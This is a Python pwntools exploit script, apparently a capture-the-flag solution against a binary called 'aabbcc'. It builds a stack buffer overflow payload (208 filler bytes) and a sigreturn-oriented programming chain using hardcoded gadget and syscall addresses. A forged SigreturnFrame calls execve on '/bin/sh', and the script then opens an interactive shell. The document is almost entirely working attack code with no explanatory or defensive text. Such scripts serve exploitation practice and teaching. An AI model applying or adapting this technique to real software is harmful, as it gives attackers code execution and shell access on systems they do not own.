#!/usr/bin/python3
from pwn import*

exe = ELF('./aabbcc',checksec=False)
#libc = ELF('./<libc_file>',checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg,data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+52         
        b*skip+85 
        c
        ''')
        input()

if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()            

prax =  0x00000000004010c5
sys =  0x0000000000401019
shell = 0x4021f4
sigfr = SigreturnFrame()
sigfr.rax = 0x3b
sigfr.rdi = shell
sigfr.rsi = 0
sigfr.rdx = 0
sigfr.rip = sys
sigfr.rsp = shell

payload = b'a'*208 + p64(prax) + p64(0xf) + p64(sys)
payload += bytes(sigfr)
payload += b'/bin/sh\0'
sa(b'> ',payload)

p.interactive()
